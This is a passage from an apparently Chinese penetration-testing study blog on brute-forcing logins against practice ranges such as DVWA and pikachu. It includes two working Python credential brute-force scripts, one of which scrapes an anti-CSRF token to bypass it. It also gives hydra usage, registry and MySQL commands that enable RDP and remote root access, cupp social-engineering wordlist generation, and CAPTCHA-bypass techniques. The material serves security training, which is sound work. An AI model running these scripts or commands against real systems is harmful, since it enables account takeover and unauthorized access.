assign-left variable">name</span><span class="token operator">=</span><span class="token string">"username"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>br/<span class="token operator">></span>    密码: <span class="token operator">&lt;</span>input <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">"text"</span> <span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"password"</span><span class="token operator">></span>    <span class="token operator">&lt;</span>br/<span class="token operator">></span>    <span class="token operator">&lt;</span>button <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">"submit"</span><span class="token operator">></span>登陆<span class="token operator">&lt;</span>/button<span class="token operator">></span>    <span class="token operator">&lt;</span>/form<span class="token operator">></span>    <span class="token operator">&lt;</span>/body<span class="token operator">></span><span class="token operator">&lt;</span>/html<span class="token operator">></span><span class="token operator">&lt;</span>?php<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token builtin class-name">echo</span> <span class="token variable">$username</span><span class="token builtin class-name">.</span><span class="token string">"/"</span><span class="token builtin class-name">.</span><span class="token variable">$password</span><span class="token builtin class-name">.</span><span class="token string">"<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">;</span>if<span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">==</span> <span class="token string">'admin'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$password</span> <span class="token operator">==</span> <span class="token string">'123456'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token builtin class-name">echo</span> <span class="token string">"欢迎您登陆成功！"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>else <span class="token punctuation">&#123;</span>    <span class="token builtin class-name">echo</span> <span class="token string">"账号或密码错误！"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="靶场练习"><a href="#靶场练习" class="headerlink" title="靶场练习"></a>靶场练习</h3><h4 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h4><p>在线靶场 <a href="http://vulfocus.cn/">http://vulfocus.cn/</a> 搜索启动 dvwa</p><p>DVWA靶场登陆账号：admin 密码：password</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">DVWA靶场已有的账号密码：<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> admin  /  <span class="token number">123456</span><span class="token operator">|</span>  <span class="token number">2</span> <span class="token operator">|</span> gordonb / abc123<span class="token operator">|</span>  <span class="token number">3</span> <span class="token operator">|</span> pablo / letmein<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="pikachu"><a href="#pikachu" class="headerlink" title="pikachu"></a>pikachu</h4><p>在线靶场 <a href="http://vulfocus.cn/">http://vulfocus.cn/</a> 搜索启动 pikachu</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">pikachu靶场已有的账号密码：<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> admin  /  <span class="token number">123456</span><span class="token operator">|</span>  <span class="token number">2</span> <span class="token operator">|</span> pikachu / 000000<span class="token operator">|</span>  <span class="token number">3</span> <span class="token operator">|</span> <span class="token builtin class-name">test</span>   /  abc123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="burp抓token爆破"><a href="#burp抓token爆破" class="headerlink" title="burp抓token爆破"></a>burp抓token爆破</h3><h4 id="token是什么？"><a href="#token是什么？" class="headerlink" title="token是什么？"></a>token是什么？</h4><p> <strong>1</strong>、<strong>Token的引入</strong>：Token是在客户端频繁向服务端请求数据，服务端频繁的去数据库查询用户名和密码并进行对比，判断用户名和密码正确与否，并作出相应提示，在这样的背景下，Token便应运而生。</p><p> <strong>2</strong>、<strong>Token的定义</strong>：Token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个Token便将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据即可，无需再次带上用户名和密码。</p><p> <strong>3</strong>、<strong>使用Token的目的</strong>：Token的目的是为了减轻服务器的压力，减少频繁的查询数据库，使服务器更加健壮。</p><h4 id="Token认证过程"><a href="#Token认证过程" class="headerlink" title="Token认证过程"></a>Token认证过程</h4><p><strong>基于Token的身份验证的过程如下:</strong></p><p>1.用户通过用户名和密码发送请求。</p><p>2.服务器端程序验证。</p><p>3.服务器端程序返回一个带签名的token 给客户端。</p><p>4.客户端储存token,并且每次访问API都携带Token到服务器端的。</p><p>5.服务端验证token，校验成功则返回请求数据，校验失败则返回错误码。</p><p><img src="/2023/012220963/22.PNG" alt="22"></p><p><strong>简单示例：</strong></p><ol><li>burp抓包发送到intruder,爆破模式选择Pitchfork</li></ol><p><img src="/2023/012220963/25.PNG" alt="25"></p><ol start="2"><li>payloads中第二个数据选择Recursive grep</li></ol><p><img src="/2023/012220963/26.PNG" alt="26"></p><ol start="3"><li>在Resourse Pool模块下的线程要调为1，因为一个token只能一时间产生一个</li></ol><p><img src="/2023/012220963/27.PNG" alt="27"></p><ol start="4"><li>Options模块的Grep-Extract模式里添加token，有的token重复刷新会界面302获取不了，记得更换新的token</li></ol><p><img src="/2023/012220963/28.PNG" alt="28"></p><ol start="5"><li>回到payloads模块加一新的token</li></ol><p><img src="/2023/012220963/28.PNG" alt="28"></p><ol start="6"><li>爆破，找出正确密码</li></ol><h3 id="Basic认证爆破"><a href="#Basic认证爆破" class="headerlink" title="Basic认证爆破"></a>Basic认证爆破</h3><p>basic认证（基本认证）是从http/1.0就定义的认证方式。即使是如今仍有一部分的网站会使用这种认证方式。</p><p><img src="/2023/012220963/23.PNG" alt="23"></p><h4 id="Basic认证过程"><a href="#Basic认证过程" class="headerlink" title="Basic认证过程"></a>Basic认证过程</h4><p><strong>步骤1</strong> ：当请求的资源须要BASIC认证时，服务器会随状态码401Authorization Requireed，返回带WWW-Authenticate首部字段的响应。该字段内包含认证的方式（BASIC）及 Request-URI安全域字符串（realm）安全</p><p><strong>步骤2</strong> ：接收到状态码401的客户端为了经过BASIC认证，须要将用户ID及密码发送给服务器。发送的字符串内容是由用户ID和密码构成，二者中间以(:)链接后，在通过Base64编码处理。服务器假设用户ID为guest，密码是guest，链接起来就会造成guest：guest这样的字符串。而后通过base64编</p><p>码，最后结果是 Z3VLc3Q6Z3Vlc3Q=。把这串字符串写入首部字段Authrization以后发送请求。网站当用户代理为浏览器时，用户仅输入用户ID和密码便可，以后，浏览器会自动完成到base64编码的转换工作</p><p><strong>步骤3</strong>： 接收到包含首部字段Authorization请求的服务器，会对认证信息的正确性进行验证。若是验证经过，则返回一条包含Request-URI的资源响应编码basic认证虽然采用了Base64编码方式，但这不是加密处理。不须要任何附加信息便可对其解码。换言之，因为明文解码后就是用户id和密码，在http等非加密通讯的路线上进行BASIC认证的工程中，若是被窃听，被盗的可能性极高。</p><p>地址：<a href="http://vulfocus.io/">http://vulfocus.io/</a> 搜索关键字 tomcat-pass-getshell</p><p><strong>操作过程待补充</strong></p><h3 id="python编写爆破脚本"><a href="#python编写爆破脚本" class="headerlink" title="python编写爆破脚本"></a>python编写爆破脚本</h3><h4 id="python异常处理"><a href="#python异常处理" class="headerlink" title="python异常处理"></a>python异常处理</h4><p>参考链接：<a href="https://www.runoob.com/python/python-exceptions.html">https://www.runoob.com/python/python-exceptions.html</a></p><h5 id="什么是异常？"><a href="#什么是异常？" class="headerlink" title="什么是异常？"></a>什么是异常？</h5><p>异常即是一个事件，该事件会在程序执行过程中发生，影响了程序的正常执行。一般情况下，在Python无法正常处理程序时就会发生一个异常。</p><p>异常是Python对象，表示一个错误。当Python脚本发生异常时我们需要捕获处理它，否则程序会终止执行。</p><h5 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h5><p>捕捉异常可以使用try/except语句。</p><p>try/except语句用来检测try语句块中的错误，从而让except语句捕获异常信息并处理。</p><p>如果你不想在异常发生时结束你的程序，只需在try里捕获它。</p><p>语法：</p><p>以下为简单的<em>try….except…else</em>的语法：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">try:<span class="token operator">&lt;</span>语句<span class="token operator">></span>        <span class="token comment">#运行别的代码</span>except <span class="token operator">&lt;</span>名字<span class="token operator">></span>：<span class="token operator">&lt;</span>语句<span class="token operator">></span>        <span class="token comment">#如果在try部份引发了'name'异常</span>except <span class="token operator">&lt;</span>名字<span class="token operator">></span>，<span class="token operator">&lt;</span>数据<span class="token operator">></span>:<span class="token operator">&lt;</span>语句<span class="token operator">></span>        <span class="token comment">#如果引发了'name'异常，获得附加的数据</span>else:<span class="token operator">&lt;</span>语句<span class="token operator">></span>        <span class="token comment">#如果没有异常发生</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="简单实例"><a href="#简单实例" class="headerlink" title="简单实例"></a>简单实例</h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">try:    fh <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"testfile"</span>, <span class="token string">"w"</span><span class="token punctuation">)</span>    fh.write<span class="token punctuation">(</span><span class="token string">"这是一个测试文件，用于测试异常!!"</span><span class="token punctuation">)</span>except IOError:    print<span class="token punctuation">(</span><span class="token string">"Error: 没有找到文件或读取文件失败"</span><span class="token punctuation">)</span>    exit<span class="token punctuation">(</span><span class="token string">"发生致命错误, 程序结束!"</span><span class="token punctuation">)</span>else:    print<span class="token punctuation">(</span><span class="token string">"内容写入文件成功"</span><span class="token punctuation">)</span>    fh.close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="mysite爆破脚本"><a href="#mysite爆破脚本" class="headerlink" title="mysite爆破脚本"></a>mysite爆破脚本</h4><p>burp.py</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">import</span> requests<span class="token function">import</span> <span class="token function">time</span><span class="token function">import</span> datetimeuser_arr <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"users.txt"</span>, <span class="token string">"r"</span>, <span class="token assign-left variable">encoding</span><span class="token operator">=</span><span class="token string">"utf8"</span><span class="token punctuation">)</span>.readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># print(user_arr)</span>pwd_arr <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"passwd.txt"</span>, <span class="token string">"r"</span>, <span class="token assign-left variable">encoding</span><span class="token operator">=</span><span class="token string">"utf8"</span><span class="token punctuation">)</span>.readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># print(pwd_arr)</span>f <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"success.txt"</span>, <span class="token string">"a"</span>, <span class="token assign-left variable">encoding</span><span class="token operator">=</span><span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token keyword">for</span> <span class="token for-or-select variable">j</span> <span class="token keyword">in</span> user_arr:    <span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> pwd_arr:        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"username"</span><span class="token builtin class-name">:</span> j.strip<span class="token punctuation">(</span><span class="token punctuation">)</span>,            <span class="token string">"password"</span><span class="token builtin class-name">:</span> i.strip<span class="token punctuation">(</span><span class="token punctuation">)</span>,       <span class="token punctuation">&#125;</span>        print<span class="token punctuation">(</span><span class="token string">"尝试使用 "</span>+j.strip<span class="token punctuation">(</span><span class="token punctuation">)</span> + <span class="token string">" / "</span> + i.strip<span class="token punctuation">(</span><span class="token punctuation">)</span> + <span class="token string">" 登陆"</span><span class="token punctuation">)</span>                try:            res <span class="token operator">=</span> requests.post<span class="token punctuation">(</span><span class="token string">"http://www.mysite.com/"</span>, <span class="token assign-left variable">data</span><span class="token operator">=</span>data, <span class="token assign-left variable">allow_redirects</span><span class="token operator">=</span>False, <span class="token assign-left variable">timeout</span><span class="token operator">=</span><span class="token number">10</span>, <span class="token assign-left variable">verify</span><span class="token operator">=</span>False<span class="token punctuation">)</span>                    except <span class="token punctuation">(</span>WindowsError<span class="token punctuation">)</span> as e:            <span class="token comment"># print(e.args)</span>            <span class="token comment"># print(type(e))</span>            print<span class="token punctuation">(</span>repr<span class="token punctuation">(</span>e<span class="token punctuation">))</span>            print<span class="token punctuation">(</span><span class="token string">"网络连接异常, 程序将自动退出"</span><span class="token punctuation">)</span>            exit<span class="token punctuation">(</span><span class="token punctuation">)</span>            except Exception as e:            print<span class="token punctuation">(</span><span class="token string">"未知错误，请查看error.log"</span><span class="token punctuation">)</span>            open<span class="token punctuation">(</span><span class="token string">"error.log"</span>, <span class="token string">"a"</span>, <span class="token assign-left variable">encoding</span><span class="token operator">=</span><span class="token string">"utf8"</span><span class="token punctuation">)</span>.write<span class="token punctuation">(</span>str<span class="token punctuation">(</span>datetime.datetime.now<span class="token punctuation">(</span><span class="token punctuation">))</span> + <span class="token string">" --- "</span> + repr<span class="token punctuation">(</span>e<span class="token punctuation">)</span> + <span class="token string">"<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span>            exit<span class="token punctuation">(</span><span class="token punctuation">)</span>                    else:            if<span class="token punctuation">(</span>res.status_code <span class="token operator">==</span> <span class="token number">302</span><span class="token punctuation">)</span>:                f.write<span class="token punctuation">(</span>j.strip<span class="token punctuation">(</span><span class="token punctuation">)</span> + <span class="token string">":"</span> + i<span class="token punctuation">)</span>                print<span class="token punctuation">(</span><span class="token string">"success"</span> + <span class="token string">"账号为 "</span> + j.strip<span class="token punctuation">(</span><span class="token punctuation">)</span> + <span class="token string">" 密码为 "</span> + i.strip<span class="token punctuation">(</span><span class="token punctuation">))</span>                time.sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>                <span class="token builtin class-name">break</span>print<span class="token punctuation">(</span><span class="token string">"运行结束~！"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="pikachu-token验证爆破脚本"><a href="#pikachu-token验证爆破脚本" class="headerlink" title="pikachu token验证爆破脚本"></a>pikachu token验证爆破脚本</h4><p>burp_token.py</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">import</span> requests<span class="token function">import</span> <span class="token function">time</span><span class="token function">import</span> datetime<span class="token function">import</span> resession <span class="token operator">=</span> requests.Session<span class="token punctuation">(</span><span class="token punctuation">)</span>user_arr <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"users.txt"</span>, <span class="token string">"r"</span>, <span class="token assign-left variable">encoding</span><span class="token operator">=</span><span class="token string">"utf8"</span><span class="token punctuation">)</span>.readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>pwd_arr <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"passwd.txt"</span>, <span class="token string">"r"</span>, <span class="token assign-left variable">encoding</span><span class="token operator">=</span><span class="token string">"utf8"</span><span class="token punctuation">)</span>.readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>f <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"success.txt"</span>, <span class="token string">"a"</span>, <span class="token assign-left variable">encoding</span><span class="token operator">=</span><span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token keyword">for</span> <span class="token for-or-select variable">j</span> <span class="token keyword">in</span> user_arr:    <span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> pwd_arr:        try:            res <span class="token operator">=</span> session.get<span class="token punctuation">(</span><span class="token string">"http://www.pikachu.com/vul/burteforce/bf_token.php"</span>, <span class="token assign-left variable">timeout</span><span class="token operator">=</span><span class="token number">10</span>, <span class="token assign-left variable">verify</span><span class="token operator">=</span>False<span class="token punctuation">)</span>        except <span class="token punctuation">(</span>WindowsError<span class="token punctuation">)</span> as e:            print<span class="token punctuation">(</span>repr<span class="token punctuation">(</span>e<span class="token punctuation">))</span>            print<span class="token punctuation">(</span><span class="token string">"网络连接异常, 程序将自动退出"</span><span class="token punctuation">)</span>            exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        except Exception as e:            print<span class="token punctuation">(</span><span class="token string">"未知错误，请查看error.log"</span><span class="token punctuation">)</span>            open<span class="token punctuation">(</span><span class="token string">"error.log"</span>, <span class="token string">"a"</span>, <span class="token assign-left variable">encoding</span><span class="token operator">=</span><span class="token string">"utf8"</span><span class="token punctuation">)</span>.write<span class="token punctuation">(</span>str<span class="token punctuation">(</span>datetime.datetime.now<span class="token punctuation">(</span><span class="token punctuation">))</span> + <span class="token string">" --- "</span> + repr<span class="token punctuation">(</span>e<span class="token punctuation">)</span> + <span class="token string">"<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span>            exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        else:            token <span class="token operator">=</span> re.findall<span class="token punctuation">(</span><span class="token string">'&lt;input type="hidden" name="token" value="(.*?)"'</span>,res.text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"username"</span><span class="token builtin class-name">:</span> j.strip<span class="token punctuation">(</span><span class="token punctuation">)</span>,            <span class="token string">"password"</span><span class="token builtin class-name">:</span> i.strip<span class="token punctuation">(</span><span class="token punctuation">)</span>,            <span class="token string">"token"</span><span class="token builtin class-name">:</span> token,            <span class="token string">"submit"</span><span class="token builtin class-name">:</span> <span class="token string">"Login"</span>      <span class="token punctuation">&#125;</span>        print<span class="token punctuation">(</span><span class="token string">"尝试使用 "</span>+j.strip<span class="token punctuation">(</span><span class="token punctuation">)</span> + <span class="token string">" / "</span> + i.strip<span class="token punctuation">(</span><span class="token punctuation">)</span> + <span class="token string">" --- token: "</span>+ token +<span class="token string">" 登陆"</span><span class="token punctuation">)</span>        try:            res <span class="token operator">=</span> session.post<span class="token punctuation">(</span><span class="token string">"http://www.pikachu.com/vul/burteforce/bf_token.php"</span>, <span class="token assign-left variable">data</span><span class="token operator">=</span>data,timeout<span class="token operator">=</span><span class="token number">10</span>, <span class="token assign-left variable">verify</span><span class="token operator">=</span>False, <span class="token assign-left variable">allow_redirects</span><span class="token operator">=</span>False<span class="token punctuation">)</span>        except <span class="token punctuation">(</span>WindowsError<span class="token punctuation">)</span> as e:            print<span class="token punctuation">(</span>repr<span class="token punctuation">(</span>e<span class="token punctuation">))</span>            print<span class="token punctuation">(</span><span class="token string">"网络连接异常, 程序将自动退出"</span><span class="token punctuation">)</span>            exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        except Exception as e:            print<span class="token punctuation">(</span><span class="token string">"未知错误，请查看error.log"</span><span class="token punctuation">)</span>            open<span class="token punctuation">(</span><span class="token string">"error.log"</span>, <span class="token string">"a"</span>, <span class="token assign-left variable">encoding</span><span class="token operator">=</span><span class="token string">"utf8"</span><span class="token punctuation">)</span>.write<span class="token punctuation">(</span>str<span class="token punctuation">(</span>datetime.datetime.now<span class="token punctuation">(</span><span class="token punctuation">))</span> + <span class="token string">" --- "</span> + repr<span class="token punctuation">(</span>e<span class="token punctuation">)</span> + <span class="token string">"<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span>            exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        else:            if<span class="token punctuation">(</span><span class="token string">"username or password is not exists"</span> not <span class="token keyword">in</span> res.text<span class="token punctuation">)</span>:                f.write<span class="token punctuation">(</span>j.strip<span class="token punctuation">(</span><span class="token punctuation">)</span> + <span class="token string">":"</span> + i<span class="token punctuation">)</span>                print<span class="token punctuation">(</span><span class="token string">"success"</span> + <span class="token string">"账号为 "</span> + j.strip<span class="token punctuation">(</span><span class="token punctuation">)</span> + <span class="token string">" 密码为 "</span> + i.strip<span class="token punctuation">(</span><span class="token punctuation">))</span>                time.sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>                <span class="token builtin class-name">break</span>print<span class="token punctuation">(</span><span class="token string">"运行结束~！"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="暴力破解2"><a href="#暴力破解2" class="headerlink" title="暴力破解2"></a>暴力破解2</h2><h3 id="CS架构破解"><a href="#CS架构破解" class="headerlink" title="CS架构破解"></a>CS架构破解</h3><p>B/S架构即 Brouser/Server ，是一种浏览器和服务器架构模式；CS架构是指服务器-客户机。服务器-客户机，即Client/Server(C/S)结构。</p><h4 id="hydra爆破工具"><a href="#hydra爆破工具" class="headerlink" title="hydra爆破工具"></a>hydra爆破工具</h4><p>hydra 可以爆破 ftp / ssh / telnet / mysql / rdp 等各种服务。</p><p>常用参数</p><p><img src="/2023/012220963/24.PNG" alt="24"></p><h5 id="学习平台实操"><a href="#学习平台实操" class="headerlink" title="学习平台实操"></a>学习平台实操</h5><p>登陆vpn访问学习平台：<a href="https://edu.work.ltsec.com/index">https://edu.work.ltsec.com/index</a> 访问暴力穷举破解进行练习</p><h5 id="mysql开启远程登录"><a href="#mysql开启远程登录" class="headerlink" title="mysql开启远程登录"></a>mysql开启远程登录</h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">登陆mysqluse <span class="token variable"><span class="token variable">`</span>mysql<span class="token variable">`</span></span><span class="token punctuation">;</span><span class="token comment"># 注意将密码替换掉</span>GRANT ALL PRIVILEGES ON *.* TO <span class="token string">'root'</span>@<span class="token string">'%'</span> IDENTIFIED BY <span class="token string">'你的密码'</span> WITH GRANTOPTION<span class="token punctuation">;</span>FLUSH PRIVILEGES<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="windows开启rdp远程桌面服务"><a href="#windows开启rdp远程桌面服务" class="headerlink" title="windows开启rdp远程桌面服务"></a>windows开启rdp远程桌面服务</h5><pre class="line-numbers language-none"><code class="language-none">查看远程端口或者使用注册表REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp &#x2F;v PortNumber再set &#x2F;a a&#x3D;0xd3d当远程桌面服务被关闭时，可以用注册表命令开启REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="超级弱口令爆破工具"><a href="#超级弱口令爆破工具" class="headerlink" title="超级弱口令爆破工具"></a>超级弱口令爆破工具</h4><p>填写目标 ip 、账户名或账号密码字典 进行爆破破解。</p><p><strong>操作待补充</strong></p><h5 id="自定义端口号"><a href="#自定义端口号" class="headerlink" title="自定义端口号"></a>自定义端口号</h5><p>点击设置可更改服务默认端口。</p><p><strong>操作待补充</strong></p><h4 id="社工字典生成"><a href="#社工字典生成" class="headerlink" title="社工字典生成"></a>社工字典生成</h4><p>当你收集到目标的具体信息后，你就可以通过工具来智能化生成关于目标的字典。当对目标进行渗透测试的时候，常见密码爆破不成功，大批量的字典耗时太长时，就需要一份结合具体目标的带社工性质的字典，可以很大提升爆破效率。</p><h5 id="亦思"><a href="#亦思" class="headerlink" title="亦思"></a>亦思</h5><p><strong>操作待补充</strong></p><h5 id="cupp"><a href="#cupp" class="headerlink" title="cupp"></a>cupp</h5><p>Cupp是一款用Python语言写成的可交互性的字典生成脚本</p><p>Kali 安装 Cupp: apt-get install cupp</p><p><strong>查看命令：****cupp</strong></p><p><strong>参数说明</strong></p><pre class="line-numbers language-none"><code class="language-none">参数名 参数含义-v 查看cupp版本号-h 查看参数列表-l 从github仓库里面下载字典-i 使用交互式的提问创建用户字典-w 在已存在的字典上进行扩展<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>执行cupp -i生成字典</strong></p><p>输入被攻击目标的姓、名、外号、生日、父母的名字、外号、生日、子女的名字、外号、生日等等一系列的信息。如果你有这些信息，直接输入，如果没有直接回车进行下一步。然后是宠物、公司等名称，需要不需要加关键字当前缀后缀等等，如果不知道或者不想加，直接回车跳过最后在命令执行的目录里生成字典文件。</p><p>注意：输入生日信息的时候是按照日、月、年的顺序，如11021990就是1990年2月11</p><h3 id="验证码绕过"><a href="#验证码绕过" class="headerlink" title="验证码绕过"></a>验证码绕过</h3><p>验证码原理：客户端发起请求-&gt;服务端响应并创建一个新的SessionID同时生成随机验证码，将验证码和SessionID一并返回给客户端-&gt;客户端提交验证码连同SessionID给服务端-&gt;服务端验证验证码同时销毁当前会话，返回给客户端结果。</p><p>【客户端可能存在的安全问题】</p><p>1、有的网站验证码由本地js生成仅仅在本地用js验证。可以在本地禁用js，用burp把验证字段删除。</p><p>2、有的网站把验证码输出到客户端html中，送到客户端Cookie或response headers。</p><p>3、有些网站默认不显示验证码，而是在输入错误一定数量之后才需要验证验证码，开发人员可能在Cookie中写入一个标记loginErr，用来记录错误数量，则可以不更新Cookie中的loginErr值反复提交，验证码就不会出现。</p><p>【服务端可能存在的安全问题】</p><p>1、验证码不过期，没有及时销毁会话导致同一验证码反复可用。攻击者可以在Cookie中带固定的sessionID和固定的验证码字符串。</p><p>2、没有对验证码进行非空判断，导致可以直接删除验证码参数。</p><p>3、产生的验证码问题有限</p><h4 id="验证码固定"><a href="#验证码固定" class="headerlink" title="验证码固定"></a>验证码固定</h4><p>导致验证码不刷新（固定）的原因是：登录密码错误之后，session中的值没有更新，验证码不变。验证码不刷新通常有以下两种情况：无条件不刷新、有条件不刷新。</p><h5 id="无条件不刷新"><a href="#无条件不刷新" class="headerlink" title="无条件不刷新"></a>无条件不刷新</h5><p>无条件不刷新是指在某一时间段内，无论登录失败多少次，只要不刷新页面，就可以无限次的使用同一个验证码来对一个或多个用户帐号进行暴力猜解。换句话说，攻击者可以在同一个会话下，在获得第一个验证码后，后面不再主动触发验证码生成页面，并且一直使用第一个验证码就可循环进行后面的表单操作，从而绕过了验证码的屏障作用，对登录进行暴力猜解。</p><h5 id="有条件不刷新"><a href="#有条件不刷新" class="headerlink" title="有条件不刷新"></a>有条件不刷新</h5><p>有条件不刷新多见于如下情况：登录失败之后，系统会打开一个新页面或者弹出一个新的警告窗口，提示用户登录失败，点击确定后返回登录界面且验证码刷新。这种情况下，只要我们不关闭新窗口或弹窗，配合使用Burpsuite的intruder模块就可以进行暴力破解了。某系统的验证码鉴权流程：用户输入账户信息+验证码(刷新页面或手动刷新验证码会从服务器获取验证码，但该验证码缓存于session中)，服务端接收到账户信息+验证后会先校验验证码是否正确，若不正确则，返回反之与数据库做对比，符合则返回，客户端接收服务端的请求，若成功则跳转，返回根据不同的错误码提示相应信息，并重新获取服务端生成的新验证码，重新缓存。</p><p>【问题描述】看完流程可以很容易想到一个问题：验证码此时并不会重置，一切重置验证码的操作都在浏览器，所以在Session不失效的时效内，可以无限重用验证码，这时就可以使用BurpSuite进行暴力破解了，验证码形同虚设。</p><p><strong>操作待补充</strong></p><p>仅在客户端生成验证码</p><p>有的网站验证码由前端js生成仅仅在前端用js验证，这种验证码形同虚设直接使用burp抓包提交即可。</p><p><strong>操作待补充</strong></p><h4 id="验证码隐藏在源码之中"><a href="#验证码隐藏在源码之中" class="headerlink" title="验证码隐藏在源码之中"></a>验证码隐藏在源码之中</h4><p>验证这种情况很简单，我们只需要记住验证码，然后右键打开网站源代码，Ctrl+F搜索，输入刚才的验证码，如果可以成功匹配到，那恭喜你，接下来就可以写工具，提取源码中的验证码并将其放入每次请求的报文中，来进行帐号破解，使用python编写脚本即可。</p><h4 id="验证码隐藏在Cookie中"><a href="#验证码隐藏在Cookie中" class="headerlink" title="验证码隐藏在Cookie中"></a>验证码隐藏在Cookie中</h4><p>一般来说，我们会把验证码的值用Session存储起来，通过对比用户提交的验证码和Session中的验证码，就可以知道输入是否正确。由于Session会占用服务器资源，有的开发人员会把验证码的值加密后存储在Cookie中。</p><p>这种情况，我们可以在提交登录的时候抓包，然后分析一下包中的Cookie字段，看看其中有没有相匹配的验证码，或者是经过了一些简单加密后的验证码。</p><h4 id="验证码可穷举"><a href="#验证码可穷举" class="headerlink" title="验证码可穷举"></a>验证码可穷举</h4><p>有的验证码不是使用算法随机生成的，而是一些固定的图片，多刷新几次验证码我们可能会发现系统中的存在就那么一些验证码，这种情况这种情况下只要将验证码全部下载下来，生成一个md5库，然后将前端生成的验证码与本地文件进行对比即可。</p><p>思路：建立图片md5库 与 